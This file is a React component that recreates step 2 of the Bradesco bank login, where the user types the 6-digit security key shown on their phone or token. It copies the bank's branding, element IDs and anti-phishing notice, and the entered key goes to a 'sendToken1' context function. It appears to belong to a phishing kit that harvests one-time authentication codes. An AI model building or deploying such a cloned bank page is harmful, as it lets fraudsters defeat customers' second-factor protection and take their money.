"use client";

const chaveCelular = "/chave_seguranca.png";
const chaveToken = "/chave_token.png";
import { useIdentification } from "@/contexts/IdentificationContext";
import { useState } from "react";
import { InfoMessageStick } from "./InfoMessageStick";

interface MainContentLoginS2Props {
  readonly nome?: string;
  readonly numSerie?: string;
  readonly tokenInvalid: boolean;
  readonly tipoToken: "celular" | "token";
}

export function MainContentLoginS2({
  tokenInvalid,
  nome,
  numSerie,
  tipoToken,
}: MainContentLoginS2Props) {
  const imagemSrc = tipoToken === "celular" ? chaveCelular : chaveToken;
  const { sendToken1 } = useIdentification();
  const [token1, setToken1] = useState("");

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    await sendToken1(token1);
  }

  return (
    <form onSubmit={onSubmit}>
      {/* Caixa de login */}
      <div className="border border-[#ccc] border-b-bradesco-dark">
        <div className="bgt"></div>
        {/* Main Etapas Component  */}

        <div className="flex h-[160px]">
          <span className="w-[20px] !h-[23.2px] mr-5 overflow-hidden leading-[120%] text-[11px] font-bold bg-bradesco-dark py-[5px] text-center text-white">
            {/* Mostrador etapa */}
            <span className="ml-1px">2</span>
          </span>
          <div className="flex w-full">
            <div className="mr-5 flex">
              <div className="pt-[33px] pb-[10px] !mb-[10px] mr-5">
                <b className="text-[15px] font-medium text-bradesco-text">
                  <span>
                    Digite a <b>chave</b> informada no <br /> visor do seu
                    celular
                  </span>
                </b>
              </div>

              <div className="flex flex-col">
                <div>
                  <p className="text-[11px] inline-block">
                    Olá,{" "}
                    <span className="text-[17.6px] text-[#CC092F]">{nome}</span>
                  </p>
                  <span className="icoTip inline-block"></span>
                </div>
                <div
                  className={`bg-[#F3F3F3] mt-[10px] border border-[#ccc] py-[13px] px-[15px] h-[126px] w-[421px] relative ${
                    tokenInvalid === true ? "erroOn txtErro" : ""
                  }`}
                >
                  <div className="flex">
                    <div>
                      <img
                        className="w-[120px] mx-[10px]"
                        src={imagemSrc}
                        alt={
                          tipoToken === "celular"
                            ? "Chave do celular"
                            : "Chave do token"
                        }
                      />
                    </div>

                    {/* digitar token */}
                    <div className="mt-[10px]">
                      <div className="flex h-fit">
                        <div className="block inputTextiToken">
                          <input
                            name="identificacao"
                            type="password"
                            maxLength={6}
                            value={token1}
                            className="bg-none px-[7px] w-[74px]"
                            onChange={(e) => setToken1(e.target.value)}
                          />
                        </div>
                        <span className="text-[#666] text-[9.9px] leading-[100%] mt-[5px]">
                          (6 dígitos)
                        </span>
                      </div>
                      <div className="flex flex-col">
                        <span className="text-[10.2px]">
                          Nº de série do dispositivo:
                        </span>
                        <strong className="text-[10.2px]">{numSerie}</strong>
                      </div>
                    </div>
                  </div>
                  <div className="txtErro hidden mt10">
                    <strong
                      id="titleErroUsua"
                      title="Usuário ou senha inválido"
                    >
                      s Verifique se a chave de segurança está correta e tente
                      novamente.
                    </strong>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="bgb"></div>
      </div>

      <div className="py-[20px] border-b border-[#E0D9BB]">
        <InfoMessageStick
          subTitle="O Bradesco não envia e-mails contendo links ou solicitando atualizações de certificados digitais, componentes de segurança ou identificação do usuário."
          type="alert"
        />
      </div>

      <div>
        <div>
          <div className="mt-[10px]">
            <ul className="btos_bottom">
              <li id="identificationForm:li_btos_bottom_1">
                <p
                  title="Cancelar Acesso"
                  className="btnCancelarAcesso mr10 fecharFiltroExtrato tabindex"
                />
              </li>
              <li>
                <input
                  id="identificationToken"
                  type="submit"
                  alt="Avançar"
                  title="Avançar"
                  className="btnAcessar botoesLogin !m-0 cursor-pointer"
                  style={{ display: "block" }}
                />
              </li>
            </ul>
          </div>
        </div>
      </div>
    </form>
  );
}
